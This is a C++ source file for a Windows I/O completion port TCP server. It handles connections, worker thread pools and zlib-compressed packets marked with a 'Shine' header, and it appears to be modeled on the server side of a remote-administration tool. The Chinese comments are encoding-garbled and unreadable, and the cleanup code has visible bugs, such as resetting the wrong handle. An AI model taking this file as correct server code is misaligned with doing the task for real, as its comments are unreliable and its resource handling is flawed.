#include "pch.h"
#include "IocpServer.h"
#include"CriticalSection1.h"
CIocpServer::CIocpServer()
{
	//�׽������ĳ�ʼ��
	WSADATA v1 = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &v1)!=0)   //�����ɹ�����ֵΪ0
	{
		//��ʼ��ʧ��
	}
	m_ListenSocket = INVALID_SOCKET;
	m_ListenThreadHandle = INVALID_HANDLE_VALUE;
	m_ThreadPoolMin = 0;
	m_ThreadPoolMax = 0;  //�����̳߳ص���
	m_WorkThreadCount = 0;
	m_IsWorking = TRUE;   //���ƹ����߳�ѭ��
	m_KillEventHandle = NULL;  
	m_IocpServer = NULL;
	for (int i = 0; i < WORK_THREAD_MAX; i++)
	{
		m_WorkThreadHandle[i] = INVALID_HANDLE_VALUE;
	}

	m_ListenEventHandle = NULL;
	InitializeCriticalSection(&m_CriticalSection);
	m_CompletionPortHandle = INVALID_HANDLE_VALUE;
	m_CurrentThreadCount = 0;
	m_BusyThreadCount = 0;
	memcpy(m_PacketHeaderFlag, "Shine", PACKET_FLAG_LENGTH);
}

CIocpServer::~CIocpServer()
{
	//������Դ
	Sleep(1);   //���߳�ͣ��һ�£������߳�һ��ִ�еĻ���

	SetEvent(m_KillEventHandle);    //�����¼�ʹ�������˳������̵߳�ѭ��

	WaitForSingleObject(m_ListenThreadHandle, INFINITE);   //�ȴ������߳��˳�
	CloseHandle(m_ListenThreadHandle);
	m_ListenThreadHandle = INVALID_HANDLE_VALUE;


	if (m_ListenSocket != INVALID_SOCKET)                //�����׽��ֵĹر�
	{
		closesocket(m_ListenSocket);
		m_ListenSocket = INVALID_SOCKET;
	}

	if (m_ListenEventHandle != NULL)                //�����¼��Ĺر�
	{
		CloseHandle(m_ListenEventHandle);
		m_ListenSocket = NULL;
	}
	if (m_KillEventHandle != NULL)                //m_KillEventHandle�¼��Ĺر�
	{
		CloseHandle(m_KillEventHandle);
		m_KillEventHandle = NULL;
	}
	m_ThreadPoolMin = 0;
	m_ThreadPoolMax = 0;
	m_WorkThreadCount = 0;
	m_IsWorking = FALSE;                //�����߳��˳�

	if (m_CompletionPortHandle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_CompletionPortHandle);
		m_CompletionPortHandle = INVALID_HANDLE_VALUE;
	}
	WaitForMultipleObjects(WORK_THREAD_MAX, m_WorkThreadHandle, TRUE, INFINITE);
	for (int i = 0; i < WORK_THREAD_MAX; i++)
	{
		CloseHandle(m_WorkThreadHandle[i]);
		m_WorkThreadHandle[i] = INVALID_HANDLE_VALUE;
	}

	DeleteCriticalSection(&m_CriticalSection);

	
	WSACleanup();   //�׽�����Դ�Ļ���






}

BOOL CIocpServer::ServerRun(USHORT ListenPort, LPFN_WNDCALLBACK WndCallback)
{

	BOOL IsOk = TRUE;
	SOCKADDR_IN	ServerAddress;   //�ṹ 

	m_WndCallback = WndCallback;
	//���ִ����¼��ķ���
	//�����¼�����(kernel32.dll)
	m_KillEventHandle = CreateEvent(NULL, FALSE, FALSE, NULL);   //�����¼�

	if (m_KillEventHandle == NULL)
	{
		return FALSE;
	}

	//���������׽���

	//Ӧ��   Http  
	//��ʾ
	//�Ự
	//����   TCP(Stream)  UDP(datagram)   
	//����   IP  Ѱַ
	//������·
	//����
	//����һ�������׽���
	m_ListenSocket = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);   //Address family internet
	if (m_ListenSocket == INVALID_SOCKET)			  //-1									 //�ص����ô��������ı������첽I/O������
	{				
		IsOk = FALSE;    
		goto Error;
	}

	//����һ�������¼�(�������)(Ws2_32.dll)  �ÿ���Ҫ��ͷ�ļ����Լ�����   #pragma comment(lib,"Ws2_32.lib") 
	m_ListenEventHandle = WSACreateEvent();    //WSACreateEvent ����������ʼ״̬Ϊ��δǩ�������ֶ������¼�����
	//��Ч��CreateEvent(NULL, TRUE, FALSE, NULL)
		 
	if (m_ListenEventHandle == WSA_INVALID_EVENT)
	{
		goto Error;
	}

	//�������׽���������¼����й�����������FD_ACCEPT��FD_CLOSE����
	IsOk = WSAEventSelect(m_ListenSocket, m_ListenEventHandle, FD_ACCEPT | FD_CLOSE);  //�ü����¼��������������¼�����
	if (IsOk == SOCKET_ERROR)  //���Ӧ�ó���������¼��͹������¼�����Ĺ淶�ɹ����򷵻�ֵΪ�㡣
							   //���򣬽�����ֵ SOCKET_ERROR�����ҿ���ͨ������ WSAGetLastError �������ض��Ĵ���š�
	{
		goto Error;
	}
	//ͨ�Ŷ˿� 0 - 2^16-1
	//��ʼ��Server������������������                        //htons��һ��ǿ������ת����host to net string
	ServerAddress.sin_port = htons(ListenPort);                    //ini�ļ����õļ����˿ڷŽ��ṹ��
	ServerAddress.sin_family = AF_INET;
	//ServerAddress.sin_addr.s_addr = INADDR_ANY;
	ServerAddress.sin_addr.S_un.S_addr = INADDR_ANY;  //���õ�ǰ��������������IP��ַ    

	//���׽���
	//�׽�������������
	IsOk = bind(m_ListenSocket,
		(sockaddr*)&ServerAddress,    //���������붨��ṹ��ƥ�䣨�½ṹ�Ϻ�����
		sizeof(ServerAddress));

	if (IsOk == SOCKET_ERROR)
	{
		int LastError = WSAGetLastError();		 //�������Է����󶨻���ִ���������������
		goto Error;             
	}

	//�����ϰ����
	IsOk = listen(m_ListenSocket, SOMAXCONN);   // 0x7fffffff�����������ﲻ��Ҳ�޷������  ��Ⲣ��������
	if (IsOk == SOCKET_ERROR)
	{
		goto Error;
	}

	//��������̶߳���ķ���ֵ���߳̾����
	//���������߳�    ע���̻߳ص����������ֶ��巽ʽ�����ַ�ʽ��Ҫ����thisָ�룬��Ҫ�������Ա�Ļ���������Ҫ����thisָ��
	m_ListenThreadHandle = CreateThread(NULL, 0, ListenThreadProcedure, (void*)this, 0, 0);
	if (m_ListenThreadHandle == INVALID_HANDLE_VALUE)
	{
		IsOk = FALSE;
		goto Error;
	}

	//��ʼ��Iocp
	InitIocp();           //�������������߳�

	return TRUE;

Error:;

	if (IsOk !=TRUE)
	{
		if (m_ListenSocket != INVALID_SOCKET)
		{
			closesocket(m_ListenSocket);
			m_ListenSocket = INVALID_SOCKET;
		}
	}
	return 0;
}

DWORD WINAPI CIocpServer::ListenThreadProcedure(LPVOID ParameterData)   //�ྲ̬��Ա���� �����̵߳�ʵ��
{
	CIocpServer* v1 = (CIocpServer*)ParameterData;
	DWORD    v2 = 0;
	WSANETWORKEVENTS NetWorkEvents;

	while (1)
	{
		v2 = WaitForSingleObject(v1->m_KillEventHandle, 100);
		if (v2 == WAIT_OBJECT_0)    
		{
			//����������������m_KillEventHandle�¼����������е�����SetEvent()���µ��¼�����
			break;
		}

		//�ȴ������¼�����
		v2 = WSAWaitForMultipleEvents(1, &(v1->m_ListenEventHandle), FALSE, 100, FALSE);  //���¼����� ������ΪSetEvent������Ϊ�����¼�
		if (v2 == WSA_WAIT_TIMEOUT)														  //Accept�¼� �ͻ������ӷ�����
		{																				  //Close�¼�  �ͻ��˶Ͽ�����
			//���¼�û������
			continue;
		}
		//������FD_ACCEPT����FD_CLOSE�¼�
		//����¼��������Ǿͽ����¼�ת����һ�������¼������ж�
		v2 = WSAEnumNetworkEvents(v1->m_ListenSocket,           //�¼�ѡ��ģ��
			v1->m_ListenEventHandle,
			&NetWorkEvents);   //�жϵĽ���洢��NetWorkEvents������

		//�ж���·�¼�
		if (v2 == SOCKET_ERROR)
		{
			//��־����
			break;
		}
		if (NetWorkEvents.lNetworkEvents & FD_ACCEPT)   //�����׽�������
		{
			if (NetWorkEvents.iErrorCode[FD_ACCEPT_BIT] == 0)
			{

				//����ͻ�����������
				v1->OnAccept();
			}
			else
			{
				break;
			}

		}
		else
		{
			//�ҳ��뿪

			//��ɾ��һ���û�ʱ�����ִ�е�����  ��Ҫ�������˳�ѭ��
			//break;
		}



	}
    //MessageBox(NULL,_T("ListenThreadProcedure"),NULL,NULL);
	return 0;

}

//�첽������ɺ�����ݷ���
DWORD WINAPI WorkThreadProcedure(LPVOID ParameterData)   //û��ʹ�ø÷���
{
	CIocpServer* v1 = (CIocpServer*)ParameterData;
	HANDLE   CompletionPortHandle = v1->m_CompletionPortHandle;
	DWORD    NumberOfBytesTransferred = 0;
	LPOVERLAPPED     Overlapped = NULL;
	PCONTEXT_OBJECT  ContextObject = NULL;  //һάָ��
	COVERLAPPEDEX* OverlappedEx = NULL;     //ָ��



	//ԭ����
	InterlockedIncrement(&v1->m_CurrentThreadCount);  //1  2
	InterlockedIncrement(&v1->m_BusyThreadCount);     //1  2

	ULONG            v3 = 0;
	BOOL             IsOk1 = FALSE;

	while (v1->m_IsWorking==TRUE)
	{


		InterlockedDecrement(&v1->m_BusyThreadCount); // 2   0


		//�ȴ���ɶ˿��е��������
			//�ú�����������������ú�������˵��������õ������
		BOOL IsOk2 = GetQueuedCompletionStatus(
			CompletionPortHandle,
			&NumberOfBytesTransferred,                    //��ɶ�������
			(PULONG_PTR)&ContextObject,       //���Key   ��õ����Key��������Ͷ�ݹ�ȥ��  ��άָ��
			&Overlapped, 60000);


		DWORD LastError = GetLastError();
		OverlappedEx = CONTAINING_RECORD(Overlapped, COVERLAPPEDEX, m_Overlapped);  //����ǿ������ת��


		//Current 2
		//Busy 0

		//m_BusyThreadCount = 1
		//v3 = 1

		//m_BusyThreadCount = 2
		//v3 = 2
		v3 = InterlockedIncrement(&v1->m_BusyThreadCount);

		//��ɶ˿��쳣(ǿ���˳�)
		if (!IsOk2 && LastError != WAIT_TIMEOUT)
		{
			//�ر��߳�
			if (ContextObject && v1->m_IsWorking == FALSE && NumberOfBytesTransferred == 0)
			{
				//���Է����׻��Ʒ����˹ر�	
				v1->RemoveContextObject(ContextObject, &OverlappedEx->m_Overlapped);
			}
			continue;
		}



		//�̳߳ص���
		if (!IsOk1)
		{

			//������ڸɻ���ж�һ���Ƿ�����ٵ���һ���߳�

			//����һ���µ��̵߳��̵߳��̳߳�
			if (v3 == v1->m_CurrentThreadCount)
			{

				if (v3 < v1->m_ThreadPoolMax)//
				{


					if (ContextObject != NULL)   //���Ƿ��ڸɻ�
					{

						HANDLE ThreadHandle = (HANDLE)CreateThread(NULL,
							0,
							(LPTHREAD_START_ROUTINE)WorkThreadProcedure,
							(void*)v1,
							0,
							NULL);
						InterlockedIncrement(&v1->m_WorkThreadCount);

						CloseHandle(ThreadHandle);
					}


				}
			}
			//����һ���̴߳��̳߳�
			if (!IsOk2 && LastError == WAIT_TIMEOUT)
			{
				if (ContextObject == NULL)
				{
					{
						if (v1->m_CurrentThreadCount > v1->m_ThreadPoolMin)
						{
							break;   //����һ���߳�
						}
					}
					IsOk2 = TRUE;
				}
			}
		}

		//������ɵ�����
		if (!IsOk1)
		{
			//��ǰ�߳�Ҫ�����������д���
			//����õ����(�������� IO_INITIALIZE IO_RECEIVE )
			if (IsOk2 && OverlappedEx != NULL && ContextObject != NULL)  //��ɶ˿��������  �¼���Ϊ��   �������Ϊ��
			{
				try
				{

					//����õ���ɵĴ�����
					v1->HandleIo(OverlappedEx->m_PackType, ContextObject, NumberOfBytesTransferred, Overlapped);

					//û���ͷ��ڴ�
					ContextObject = NULL;

				}
				catch (...) {}
			}
		}


		if (OverlappedEx)
		{
			delete OverlappedEx;
			OverlappedEx = NULL;
		}


	}

	InterlockedDecrement(&v1->m_WorkThreadCount);
	InterlockedDecrement(&v1->m_CurrentThreadCount);
	InterlockedDecrement(&v1->m_BusyThreadCount);


	TCHAR v10[0x1000] = { 0 };
	_stprintf_s(v10, _T("ThreadIdentity:%d"), GetCurrentThreadId());
	//MessageBox(NULL, _T("WorkThreadProcedure"), v10, 0);

	return 0;

}

BOOL CIocpServer::HandleIo(PACKET_TYPE PacketType, PCONTEXT_OBJECT ContextObject,
	DWORD NumberOfBytesTransferred, LPOVERLAPPED Overlapped)
{
	BOOL v1 = FALSE;

	if (IO_INITIALIZE == PacketType)
	{
		//MessageBox(NULL, _T("IO_INITIALIZE"), _T("IO_INITIALIZE"), 0);
	}

	if (IO_RECEIVE == PacketType)
	{
		//���SendLoginInformation���ݷ���
		v1 = OnReceiving(ContextObject, NumberOfBytesTransferred,Overlapped);
	}

	if (IO_SEND == PacketType)
	{
		v1 = OnSending(ContextObject, NumberOfBytesTransferred, Overlapped);
	}
	return v1;
}


BOOL CIocpServer::OnReceiving(PCONTEXT_OBJECT  ContextObject, DWORD BufferLength, LPOVERLAPPED Overlapped)
{
	CCriticalSection1 CriticalSection(&m_CriticalSection);
	try
	{

		if (BufferLength == 0)
		{
			//�Է��ر����׽���
			//MessageBox(NULL, _T("�ر��׽���"), _T("�ر��׽���"), 0);
			RemoveContextObject(ContextObject,Overlapped);
			return FALSE;
		}


		//���ӵ������ݿ�����m_ReceivedCompressedBufferData
		ContextObject->m_ReceivedCompressedBufferData.WriteArray(
			(PBYTE)ContextObject->BufferData, BufferLength);
		//�����յ������ݿ����������Լ����ڴ���wsabuff    8192

//��ȡ���ݰ���ͷ��(���ݰ���ͷ���ǲ�����ѹ����)
		while (ContextObject->m_ReceivedCompressedBufferData.GetArrayLength() > PACKET_HEADER_LENGTH)
		{
			//�洢���ݰ�ͷ����־
			char v1[PACKET_FLAG_LENGTH] = { 0 };//Shine[][][]


			//�������ݰ�ͷ����־
			CopyMemory(v1, ContextObject->m_ReceivedCompressedBufferData.GetArray(), PACKET_FLAG_LENGTH);


			//У�����ݰ�ͷ����־
			if (memcmp(m_PacketHeaderFlag, v1, PACKET_FLAG_LENGTH) != 0)
			{
				throw "Bad Buffer";
			}

			//��ȡ���ݰ��ܴ�С
			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength,
				ContextObject->m_ReceivedCompressedBufferData.GetArray(PACKET_FLAG_LENGTH),
				sizeof(ULONG));


			if (PackTotalLength &&
				(ContextObject->m_ReceivedCompressedBufferData.GetArrayLength()) >= PackTotalLength)
			{
				//[Shine][ѹ���ĳ���+13][û��ѹ���ĳ���][HelloWorld.......]
				ULONG DecompressedLength = 0;

				ContextObject->m_ReceivedCompressedBufferData.ReadArray((PBYTE)v1, PACKET_FLAG_LENGTH);

				//[ѹ���ĳ���+13][û��ѹ���ĳ���][HelloWorld.......]
				ContextObject->m_ReceivedCompressedBufferData.ReadArray((PBYTE)&PackTotalLength,
					sizeof(ULONG));

				//[û��ѹ���ĳ���][HelloWorld.......]
				ContextObject->m_ReceivedCompressedBufferData.ReadArray((PBYTE)&DecompressedLength,
					sizeof(ULONG));

				//[HelloWorld.......]
				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;   //��ѹ�������ʵ���ݵĳ���

				//ѹ������
				PBYTE CompressedData = new BYTE[CompressedLength];

				//��ѹ������
				PBYTE DecompressedData = new BYTE[DecompressedLength];  //��ѹ�������ݳ��� 

				if (CompressedData == NULL || DecompressedData == NULL)
				{
					throw "Bad Allocate";

				}

				//�����ݰ��л�ȡѹ���������
				ContextObject->m_ReceivedCompressedBufferData.ReadArray(CompressedData, CompressedLength);


				//��ѹ��
				int	IsOk = uncompress(DecompressedData,
					&DecompressedLength, CompressedData, CompressedLength);

				if (IsOk == Z_OK)
				{
					ContextObject->m_ReceivedDecompressedBufferData.ClearArray();
					ContextObject->m_ReceivedCompressedBufferData.ClearArray();

					//������ʵ����
					ContextObject->m_ReceivedDecompressedBufferData.WriteArray(DecompressedData,
						DecompressedLength);


					delete[] CompressedData;
					delete[] DecompressedData;

					//���ڻص�����(����ָ��)
					m_WndCallback(ContextObject);  //֪ͨ����  ���ܵ��ı���ѹ������ 
				}
				else
				{
					delete[] CompressedData;
					delete[] DecompressedData;
					throw "Bad Buffer";
				}



			}
			else
			{
				break;
			}
		}

		//��һ�ε��첽�����Ѿ��õ��������Ͷ���µ��첽����
		PostReceive(ContextObject);
	}
	catch (...)
	{
		ContextObject->m_ReceivedDecompressedBufferData.ClearArray();
		ContextObject->m_ReceivedCompressedBufferData.ClearArray();

		PostReceive(ContextObject);
	}

	return TRUE;

}

VOID CIocpServer::OnPrepareSending(CONTEXT_OBJECT* ContextObject, PBYTE BufferData, ULONG BufferLength)
{
	if (ContextObject == NULL)
	{
		return;   //û��Ŀ��
	}

	try
	{
		if (BufferLength > 0)
		{
			unsigned long	CompressedLength = (double)BufferLength * 1.001 + 12;
			LPBYTE			CompressedData = new BYTE[CompressedLength];
			int	IsOk = compress(CompressedData, &CompressedLength, (LPBYTE)BufferData, BufferLength);

			if (IsOk != Z_OK)
			{
				delete[] CompressedData;
				return;
			}
			ULONG PackTotalLength = CompressedLength + PACKET_HEADER_LENGTH;
			//�������ݰ�ͷ��
			ContextObject->m_SendCompressedBufferData.WriteArray((LPBYTE)m_PacketHeaderFlag, PACKET_FLAG_LENGTH);
			//[Shine]
			ContextObject->m_SendCompressedBufferData.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));
			//[Shine][PackTotalLength]
			ContextObject->m_SendCompressedBufferData.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));
			//[Shine][PackTotalLength][BufferLength]
			ContextObject->m_SendCompressedBufferData.WriteArray(CompressedData, CompressedLength);
			//[Shine][PackTotalLength][BufferLength][.....(��ʵ����)]
			delete[] CompressedData;
		}
		COVERLAPPEDEX* OverlappedEx = new COVERLAPPEDEX(IO_SEND);

		//��������Ͷ�ݵ���ɶ˿�  
		PostQueuedCompletionStatus(m_CompletionPortHandle, 0, (ULONG_PTR)ContextObject,
			&OverlappedEx->m_Overlapped);
	}
	catch (...) {}
}
BOOL CIocpServer::OnSending(CONTEXT_OBJECT* ContextObject, ULONG BufferLength, LPOVERLAPPED Overlapped)
{
	try
	{
		DWORD Flags = MSG_PARTIAL;   //û������
		//����ɵ����ݴ����ݽṹ��ȥ��
		ContextObject->m_SendCompressedBufferData.RemoveArray(BufferLength);
		//�жϻ��ж���������Ҫ����
		if (ContextObject->m_SendCompressedBufferData.GetArrayLength() == 0)
		{
			//�����Ѿ��������
			ContextObject->m_SendCompressedBufferData.ClearArray();
			return true;
		}
		else
		{
			//������������
			COVERLAPPEDEX* OverlappedEx = new COVERLAPPEDEX(IO_SEND);

			//��ѹ��������ݹ�������׼������������
			ContextObject->SendBuffer.buf = (char*)ContextObject->m_SendCompressedBufferData.GetArray();
			ContextObject->SendBuffer.len = ContextObject->m_SendCompressedBufferData.GetArrayLength();


			//�����wsa�����������
			int IsOk = WSASend(ContextObject->ClientSocket,
				&ContextObject->SendBuffer,
				1,
				&ContextObject->SendBuffer.len,
				Flags,
				&OverlappedEx->m_Overlapped,    //�����µ��첽����
				NULL);
			if (IsOk == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING)
			{
				//����ʧ����
				RemoveContextObject(ContextObject, Overlapped);   //����������첽����
			}
		}
	}
	catch (...) {}
	return FALSE;
}


void CIocpServer::InitIocp()
{

	//������ɶ˿�
	m_CompletionPortHandle = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
	if (m_CompletionPortHandle == NULL)
	{
		return;
	}
	//����һ���ٷ��ṹ�����
	SYSTEM_INFO SystemInfo;
	//��ȡϵͳ��Ϣ ���õ�ϵͳ�ĺ���
	GetSystemInfo(&SystemInfo);     

	//�̳߳�
	m_ThreadPoolMin = 1;
	m_ThreadPoolMax = SystemInfo.dwNumberOfProcessors * 2;

	//�������������߳�
	ULONG  WorkThreadCount = WORK_THREAD_MAX;
	

	for (int i = 0; i < WorkThreadCount; i++)
	{
		
		m_WorkThreadHandle[i] = CreateThread(NULL,	  
			0,
			(LPTHREAD_START_ROUTINE)WorkThreadProcedure,             
			(void*)this,
			0,
			NULL);  //�������߳�Identity
		if (m_WorkThreadHandle[i] == NULL)
		{
			CloseHandle(m_CompletionPortHandle);
			return;
		}
		m_WorkThreadCount++;
	}
}

void CIocpServer::OnAccept()
{

	//MessageBox(NULL, _T("OnAccept()"), NULL, 0);   

	//�ͻ�������
	int			Result = 0;

	//���������û�IP��ַ
	SOCKET		ClientSocket = INVALID_SOCKET;    //ͨ���׽���
	SOCKADDR_IN	ClientAddress = { 0 };            //�洢�ͻ��˵�ַ
	int			ClientAddressLength = sizeof(SOCKADDR_IN);

	//ͨ�����ǵļ����׽���������һ����֮�ź�ͨ�ŵ��׽���


	//��������Ըôοͻ��������������Ӧ��ͨ���׽���    connect�������Ӧ
	ClientSocket = accept(m_ListenSocket,
		(sockaddr*)&ClientAddress,   //accept�����Ըýṹ��ֵ��ǿת����Ϊ�ṹ�����͵İ汾�ϸߣ������汾�ϵ�
		&ClientAddressLength);


	if (ClientSocket == SOCKET_ERROR)
	{
		return;
	}


	//����������Ϊÿһ��������ź�ά����һ����֮���������ݽṹ������Ϊ�û������±�����
	PCONTEXT_OBJECT ContextObject = AllocateContextObject();

	if (ContextObject == NULL)
	{

		closesocket(ClientSocket);   //�ر�����
		ClientSocket = INVALID_SOCKET;
		return;
	}


	//��Ա��ֵ
	ContextObject->ClientSocket = ClientSocket;  //Send Recv

	//�����ڴ�
	ContextObject->ReceiveBuffer.buf = (char*)ContextObject->BufferData;  
	ContextObject->ReceiveBuffer.len = sizeof(ContextObject->BufferData);

	//�����ɵ�ͨ���׽�������ɶ˿ھ�������
	HANDLE Handle = CreateIoCompletionPort((HANDLE)ClientSocket,
		m_CompletionPortHandle, (ULONG_PTR)ContextObject, 0);     //����������ָ�� ���Key
	if (Handle != m_CompletionPortHandle)
	{
		delete ContextObject;   //���ٶ���
		ContextObject = NULL;
		if (ClientSocket != INVALID_SOCKET)
		{
			closesocket(ClientSocket);
			ClientSocket = INVALID_SOCKET;
		}
		return;
	}

	//�������
	//�����׽��ֵ�ѡ� Set KeepAlive ����������� SO_KEEPALIVE 
	//�������Ӽ��Է������Ƿ�������2Сʱ���ڴ��׽ӿڵ���һ����û
	//�����ݽ�����TCP���Զ����Է� ��һ�����ִ��
	m_KeepAliveTime = 3;     //����
	const BOOL IsKeepAlive = TRUE;
	//�����׽���ѡ��  �򿪻���
	if (setsockopt(ContextObject->ClientSocket, SOL_SOCKET, SO_KEEPALIVE, (char*)&IsKeepAlive, sizeof(IsKeepAlive)) != 0)
	{
	}

	//���ó�ʱ��ϸ��Ϣ
	tcp_keepalive	KeepAlive;
	KeepAlive.onoff = 1; // ���ñ���
	KeepAlive.keepalivetime = m_KeepAliveTime;       //����3����û�����ݣ��ͷ���̽���
	KeepAlive.keepaliveinterval = 1000 * 10;         //���Լ��Ϊ10�� Resend if No-Reply
	WSAIoctl
	(
		ContextObject->ClientSocket,
		SIO_KEEPALIVE_VALS,
		&KeepAlive,
		sizeof(KeepAlive),
		NULL,
		0,
		(unsigned long*)&IsKeepAlive,
		0,
		NULL
	);

	//����������ʱ����������ͻ������߻�ϵ�ȷ������Ͽ����������������û������SO_KEEPALIVEѡ�
	//���һֱ���ر�SOCKET����Ϊ�ϵ�������Ĭ������Сʱʱ��̫�����������Ǿ��������ֵ

	CCriticalSection1 CriticalSection(&m_CriticalSection);  //Stack Object
	m_ConnectContextList.AddTail(ContextObject);     //���뵽���ǵ��ڴ��б���

	COVERLAPPEDEX* OverlappedEx = new COVERLAPPEDEX(IO_INITIALIZE);
	BOOL IsOk = FALSE;
	//����ɶ˿���Ͷ��һ������
	//�����̻߳�ȴ���ɶ˿ڵ����״̬
	IsOk = PostQueuedCompletionStatus(m_CompletionPortHandle,
		0, (ULONG_PTR)ContextObject, &OverlappedEx->m_Overlapped);  //�Լ����Լ�����ɶ˿�Ͷ������

	if ((!IsOk && GetLastError() != ERROR_IO_PENDING))
	{
		//���Ͷ��ʧ��
		RemoveContextObject(ContextObject, &OverlappedEx->m_Overlapped);
		return;
	}

	//�������û��Ѿ���������ߵ�����
	//����������û�Ͷ��PostRecv����
	PostReceive(ContextObject);   //Ͷ�ݽ��ܿͻ������ݵ��첽IO
}

VOID CIocpServer::PostReceive(CONTEXT_OBJECT* ContextObject)
{
	//�����ǵĸ����ߵ��û���Ͷ��һ���������ݵ�����
	//���������õ����(�û���������)
	//�����߳�(�غ�����ɶ˿�)����Ӧ������HandleIO����
	COVERLAPPEDEX* OverlappedEx = new COVERLAPPEDEX(IO_RECEIVE);

	DWORD			ReturnLength;
	ULONG			Flags = MSG_PARTIAL;   //û������

	//�������ص�������û�еõ����
	int IsOk = WSARecv(ContextObject->ClientSocket,
		&ContextObject->ReceiveBuffer,   //�������ݵ��ڴ�
		1,
		&ReturnLength,                      //TransferBufferLength
		&Flags,
		&OverlappedEx->m_Overlapped,   //�¼�
		NULL);
	//����ֵ�Ǵ��� && �����Ǵ����е�δ��� == �ɹ�
	if (IsOk == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING)   //����  δ���
	{
		//�����ʹ���
		RemoveContextObject(ContextObject, &OverlappedEx->m_Overlapped);   //�궿��  
	}
}

VOID CIocpServer::RemoveContextObject(CONTEXT_OBJECT* ContextObject,LPOVERLAPPED Overlapped)
{

	CCriticalSection1 CriticalSection(&m_CriticalSection);
	//���ڴ��в��Ҹ��û������±��������ݽṹ
	if (m_ConnectContextList.Find(ContextObject))
	{
		//ȡ���ڵ�ǰ�׽��ֵ��첽IO��ǰ��δ��ɵ��첽����ȫ������ȡ��   
		CancelIo((HANDLE)ContextObject->ClientSocket);    //�Ὣ�ö�����û�еõ���ɵ��첽Io�������
		//�ر��׽���
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = INVALID_SOCKET;
		//�жϻ���û���첽IO�����ڵ�ǰ�׽�����
		while (!HasOverlappedIoCompleted((LPOVERLAPPED)Overlapped))   //�鿴һ����ɶ˿ڻ���û�����Ƶ�����   ????????????
		{
			Sleep(1);
		}
		//�����ڴ�ṹ�������ڴ��
		MoveContextObjectToFreePool(ContextObject);   //���ն����ڴ浽�ڴ��
	}
}

VOID CIocpServer::MoveContextObjectToFreePool(CONTEXT_OBJECT* ContextObject)
{

	CCriticalSection1 CriticalSection(&m_CriticalSection);

	POSITION Position = m_ConnectContextList.Find(ContextObject);
	if (Position)
	{

		ContextObject->m_ReceivedCompressedBufferData.ClearArray();
		ContextObject->m_ReceivedDecompressedBufferData.ClearArray();
		ContextObject->m_SendCompressedBufferData.ClearArray();

		memset(ContextObject->BufferData, 0, PACKET_LENGTH);
		m_FreeContextList.AddTail(ContextObject);                         //�������ڴ��
		m_ConnectContextList.RemoveAt(Position);                          //���ڴ�ṹ���Ƴ�

	}
}


PCONTEXT_OBJECT CIocpServer::AllocateContextObject()
{
	PCONTEXT_OBJECT ContextObject = NULL;         //����һ������

	//����һ���ٽ���
	CCriticalSection1 CriticalSection(&m_CriticalSection);   //�Զ����װ��һ���߳�ͬ���ٽ�������
	//�ж��ڴ���Ƿ�Ϊ��
	//�ڴ��
	if (m_FreeContextList.IsEmpty() == FALSE)
	{
		//�ڴ��ȡ�ڴ�
		ContextObject = m_FreeContextList.RemoveHead();
	}
	else
	{
		ContextObject = new CONTEXT_OBJECT;   //��һ�οͻ������±��������ɵ�ʱ��
	}
	if (ContextObject != NULL)
	{
		//��ʼ����Ա����
		ContextObject->InitializeMember();  //Clinet BufferData WSABuffer  WSABuffer  Array1 Array2 Array3
	}
	
	return ContextObject;
}

